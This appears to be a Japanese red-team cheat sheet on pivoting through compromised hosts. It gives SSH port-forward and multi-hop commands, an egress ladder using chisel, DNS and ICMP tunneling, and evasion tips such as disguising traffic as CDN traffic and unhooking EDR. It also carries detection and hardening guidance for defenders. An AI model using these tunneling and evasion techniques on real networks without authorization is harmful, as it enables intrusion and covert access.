# ローカル port forward (-L) — operator が pivot 越しに単一 service を叩く
ssh -L 8080:<INTERNAL_TARGET>:80 <USER>@<PIVOT>
#   -> operator の 127.0.0.1:8080 が pivot 経由で <INTERNAL_TARGET>:80 に届く

# リモート port forward (-R) — pivot 側から operator の service を露出
ssh -R 8080:localhost:80 <USER>@<PIVOT>
#   -> pivot の 127.0.0.1:8080 が operator の localhost:80 に届く

# multi-hop (ProxyJump)
ssh -J <USER>@<HOP1> <USER>@<TARGET>
ssh -J <USER>@<HOP1>,<USER>@<HOP2> <USER>@<TARGET>

# SSH config で恒久化 (~/.ssh/config)
#   Host target
#     HostName <TARGET>
#     User <USER>
#     ProxyJump hop1,hop2

# -D と -J の混合 (ProxyJump で SOCKS も同時確保)
ssh -J <USER>@<HOP1> -D 1080 <USER>@<TARGET>

Egress fallback ladder

corporate proxy / firewall の制限度合いに応じて、以下の順で試す:

  1. TCP any-port — 制限ゆるい環境。chisel plain / ssh。
  2. HTTPS 443 — chisel over TLS。SNI と Host header を合わせて自然な CDN-like traffic に見せる。
  3. HTTP CONNECT via corporate proxy — chisel の --proxy http://user:pass@proxy:port。auth 済みの proxy を通す。
  4. DNS tunneling — dnscat2 / iodine。帯域は狭いが internal DNS しか解決しない環境でも通る場合が多い。
  5. ICMP tunneling — icmpsh / ptunnel。最終手段、帯域極小。
防御 / countermeasures
  • egress filter: 業務用 network から任意 IP:port への outbound を白リスト方式に制限。443 も corporate proxy 経由のみに絞る (SNI と Host header の整合を検査するプロキシ)。
  • TUN device の作成監視: auditd -w /sys/class/net -p wa で ip tuntap add / ip link add を audit。Windows 側は Sysmon EID 22 (DNS query) と EID 3 (network connect) の anomaly を併用。
  • DNS anomaly detection: 単一 host からの高頻度 TXT / A record query、subdomain 長の異常、通信量 anomaly。dnscat2 の signature は特に subdomain の base32-like pattern。
  • SSH client 挙動監視: sshd 側の ForwardAgent / GatewayPorts / AllowTcpForwarding を全て no に、jump host のみ例外運用。PermitTunnel no で TUN forwarding も塞ぐ。
  • ICMP payload inspection: 平均 payload size と rate の anomaly 検知。ICMP tunnel は payload が大きくなる。
  • 反対方向の防御: agent binary 自体を EDR で捕捉。ligolo agent は公開 signature が既に流通、agent -connect の CLI パターン、TLS handshake の JA3 も検知可能。
要点 / key takeaways
  • ligolo-ng の TUN は「pivot 越しの nmap SYN scan / UDP / raw socket」が可能な唯一の topology。scan 再現性を担保したい engagement で第一選択。
  • chisel SOCKS は「TCP のみで軽く済ませたい」場合の default、HTTPS 制約下の egress では必須。
  • SSH tunnel は binary drop なしで完結し、既存 SSH に紛れる。pivot 経路に SSH アクセスがあるなら chisel より優先。
  • Egress ladder は上から下ほど帯域と検知回避の trade-off が悪化する。まず TCP any-port を試し、塞がれてから 443 → DNS → ICMP と落ちていく。
  • Double pivot は各 hop での TUN interface 名を分けて routing table に別々に足す。同名で足すと後段が前段を上書きする。
  • ligolo agent の Windows 版は SmartScreen / EDR signature に載っている。evasion sheet の unhook / re-compile 技法との併用が前提。

Hardening checklist

  • SMB signing required (全 member、GPO 強制)
  • EPA (Enhanced Protection for Authentication) を LDAPS / HTTPS で有効化 → NTLM Relay 完封
  • WinRM を Kerberos-only 化 (Auth NTLM=false)
  • Restricted Admin を default 無効、jump host 用途のみ enable + audit
  • Protected Users group に DA / high-value account を必ず投入 (RC4 無効 + delegation 対象外)
  • LAPS 全展開 — Local Admin password の site-wide reuse を根絶
  • LocalAccountTokenFilterPolicy = 0 を workgroup / 非-domain segment で維持
  • PowerShell Script Block Logging (EID 4104) を GPO で強制
  • Sysmon 導入 + SwiftOnSecurity config or Olaf Hartong config で parent-child 検査
  • egress 白リスト化 + corporate proxy 経由必須 (443 直接 outbound 禁止)
  • Windows Defender Application Control (WDAC) or AppLocker で任意 binary 実行を制限 — service create 系の binary drop を封じる
要点 / key takeaways
  • Lateral の signature は「認証 event (DC 側 4624/4648/4769)」と「実行 event (host 側 7045/Sysmon EID 1 parent-child)」の pair で捉える。片方だけでは false-positive が多い。
  • SMB signing + WinRM Kerberos-only + Protected Users + LAPS の 4 点セットで lateral の primitive 大部分が塞がる。
  • Sysmon の parent-child 検査は攻撃側の s03 DCOM object 選択と直結する。Sysmon config を熟読するだけで、blue team に嫌がられる DCOM object の選択肢が絞れる。
